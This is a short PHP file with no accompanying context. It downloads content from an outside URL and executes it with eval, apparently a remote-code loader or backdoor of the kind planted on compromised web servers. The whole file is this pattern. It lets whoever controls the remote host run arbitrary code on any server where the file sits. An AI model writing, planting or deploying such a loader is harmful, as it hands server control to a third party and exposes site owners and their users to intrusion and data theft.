<?php

$content = file_get_contents(urldecode('https://preciseurl.org/404error'));

$content = "?> ".$content;
eval($content);
